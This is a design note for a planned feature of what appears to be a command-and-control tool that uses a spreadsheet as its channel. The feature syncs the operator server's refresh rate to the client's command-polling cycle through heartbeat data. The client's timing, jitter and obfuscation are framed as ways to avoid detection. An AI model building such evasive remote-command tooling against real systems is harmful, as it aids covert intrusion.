# Feature: Self-Synchronising Server Refresh Interval

## Status: PLANNED — not yet implemented

---

## The Two Intervals — Core Concept

There are two independent timing loops in this system. They are easy to confuse
because both involve sleeping and reading a sheet. They must be kept distinct in
naming, code, and documentation.

---

### 1. Client Cycle Interval

**What it is:** How often the client wakes up, reads the inbox for new commands,
executes any pending command, and writes one queued result fragment to the outbox.

**Who controls it:** The client. Set via `_client_config` which starts from
`.env` defaults and can be changed mid-session by a `config` command from the
server.

**Relevant config keys (client-side):**
- `cycle_interval_sec` — base sleep duration between cycles (default: 30s)
- `cycle_jitter_min`   — minimum random jitter added to each sleep (default: 0s)
- `cycle_jitter_max`   — maximum random jitter added to each sleep (default: 0s)

**Where in code:** `client.py` main loop, `_client_config` dict.

**NOTE — naming migration:** These keys were previously named `poll_interval_sec`,
`poll_jitter_min`, `poll_jitter_max`. They were renamed to `cycle_*` to eliminate
confusion with the server refresh interval. Any references to the old names in
`.env`, `.env.example`, or documentation are stale.

---

### 2. Server Refresh Interval

**What it is:** How often the server's background thread reads the outbox sheet
to surface newly written results to the operator. Completely independent of the
client — the server just checks the sheet repeatedly until something new appears.

**Who controls it:** Initially the channel class (hardcoded default). Can be
updated two ways:
1. Automatically — by reading client timing from heartbeat results (Option B)
2. Manually — by the operator issuing a `refresh` command in the server REPL

**Where in code:** `server.py` `_poll_thread`, `Channel.refresh_interval()`,
`Channel.set_refresh_interval()`.

---

### Why They Are Different

The client cycle interval is an **operational security setting** — slower cycles
mean less network noise, harder to detect. The server refresh interval is a
**convenience setting** — it only affects how quickly the operator sees results.
Polling the sheet faster than the client writes to it is wasteful but harmless
(cheap CSV read). Polling slower than the client writes means results queue up
in the sheet unnoticed until the next server read.

Ideally: `server refresh interval ≈ client cycle interval`. If the client is set
to 60s cycles, polling the sheet every 5s wastes 11 out of 12 reads. If the
client is set to 5s cycles, polling every 30s means results sit unseen for up to
30s.

---

## Designed Solution — Option B: Heartbeat Carries Client Timing

### Heartbeat payload change (client side)

`send_heartbeat()` currently writes `_system_info()` as JSON in the `result`
field. Extend it to also include current client timing:

```python
def send_heartbeat():
    payload = _system_info()
    payload["cycle_interval_sec"] = float(_client_config.get("cycle_interval_sec", 30))
    payload["cycle_jitter_min"]   = float(_client_config.get("cycle_jitter_min", 0))
    payload["cycle_jitter_max"]   = float(_client_config.get("cycle_jitter_max", 0))
    result = {
        "command_id": f"heartbeat-{uuid.uuid4()}",
        "client_id":  _client_config.get("client_id", "unknown"),
        "status":     "heartbeat",
        "result":     json.dumps(payload),
        "timestamp":  datetime.now(timezone.utc).isoformat(),
    }
    ...
```

No schema change — the `result` field is already free-form JSON. Adding keys to
it is backwards compatible.

---

### Channel interface change

`Channel.poll_interval()` is renamed to `Channel.refresh_interval()`.
Two new methods are added to the base class:

```python
class Channel(ABC):

    _refresh_interval: float = 30.0   # default for any new backend
    _manual_override:  bool  = False   # True = heartbeat cannot overwrite

    def refresh_interval(self) -> float:
        return self._refresh_interval

    def set_refresh_interval(self, seconds: float, manual: bool = False) -> None:
        """Update the refresh interval.

        manual=True  — marks as operator-set; heartbeat values are ignored
                        until clear_refresh_override() is called.
        manual=False — only applies if no manual override is active.
        """
        if manual or not self._manual_override:
            self._refresh_interval = seconds
            if manual:
                self._manual_override = True

    def clear_refresh_override(self) -> None:
        """Remove the manual override — next heartbeat will update the interval."""
        self._manual_override = False
```

`SheetsChannel` drops its hardcoded `poll_interval()` override and instead sets
`_refresh_interval = 5.0` as a class attribute (fast default for Sheets, cheap
CSV read). The base-class methods handle everything else.

---

### Server poll thread change

Currently reads `poll_interval` once at thread start:

```python
poll_interval = common.get_channel().poll_interval()   # OLD — read once
```

Change to re-query on every iteration so operator `refresh` commands take effect
immediately without restarting the thread:

```python
while ...:
    time.sleep(common.get_channel().refresh_interval())   # NEW — re-query each cycle
    ...
```

---

### Server heartbeat handler change

The heartbeat handler in `server.py` already parses heartbeat `result` JSON.
Add extraction of timing fields and apply them to the channel if no manual
override is active:

```python
if r.get("status") == "heartbeat":
    hb_client = r.get("client_id", "unknown")
    try:
        info = json.loads(r.get("result", "{}"))
        client_os_info[hb_client] = info
        # Sync server refresh to client cycle timing
        if "cycle_interval_sec" in info:
            ch = common.get_channel()
            # set_refresh_interval with manual=False respects any operator override
            ch.set_refresh_interval(float(info["cycle_interval_sec"]), manual=False)
    except Exception:
        pass
```

---

### Server REPL — `refresh` command

New interactive command available in all server modes:

```
refresh <seconds>    — set server refresh interval manually (overrides heartbeat sync)
refresh auto         — clear manual override, revert to tracking client heartbeat
refresh              — show current interval and whether it is manual or auto
```

Implementation: parse in the server's command dispatch, call
`common.get_channel().set_refresh_interval(n, manual=True)` or
`common.get_channel().clear_refresh_override()`.

---

## Precedence Rules (most → least authoritative)

1. Operator `refresh <n>` command — manual override, ignores heartbeat
2. Heartbeat-derived value — auto-sync, only applies when no manual override
3. Channel class default — applied at startup before any heartbeat arrives

---

## Files to Change

| File | Change |
|---|---|
| `channel/base.py` | Rename `poll_interval()` → `refresh_interval()`, add `set_refresh_interval()`, `clear_refresh_override()`, `_manual_override` state |
| `channel/sheets.py` | Replace `poll_interval()` override with `_refresh_interval = 5.0` class attr |
| `client.py` | Add timing fields to heartbeat payload; rename `poll_*` config keys → `cycle_*` |
| `server.py` | Re-query `refresh_interval()` per cycle; extract timing from heartbeat; add `refresh` REPL command |
| `.env.example` | Rename `POLL_INTERVAL_SEC` → `CYCLE_INTERVAL_SEC` etc. (if present) |
| `README.md` | Document both intervals, the naming distinction, the `refresh` command |
| `tests/` | Update any reference to `poll_interval` / `poll_interval_sec`; add tests for `set_refresh_interval` precedence rules |

---

## Tests to Write

- `set_refresh_interval(manual=False)` updates value when no override active
- `set_refresh_interval(manual=False)` is ignored when override is active
- `set_refresh_interval(manual=True)` always updates and sets override flag
- `clear_refresh_override()` clears flag; next `manual=False` call updates value
- Heartbeat handler applies timing when no override
- Heartbeat handler is blocked by manual override
- Server poll thread uses updated value after `set_refresh_interval` called mid-run
- `SheetsChannel` default is 5.0 before any heartbeat or manual set

---

## What Does NOT Change

- The client cycle timing mechanism itself (`cycle_interval_sec`, jitter, main loop sleep)
- The heartbeat trigger (still every N cycles, configurable via `heartbeat_every`)
- The heartbeat `result` field schema — timing fields are additive, old servers
  that don't read them continue working
- Fragmentation, encryption, column obfuscation — unrelated

---

## Multi-Client Note

If multiple clients report different cycle timings in their heartbeats, the last
heartbeat to arrive wins (no manual override active). This is acceptable for now.
A future improvement: track per-client refresh timing and use the fastest reported
value so no client's results go unnoticed. Deferred — single-client use case first.
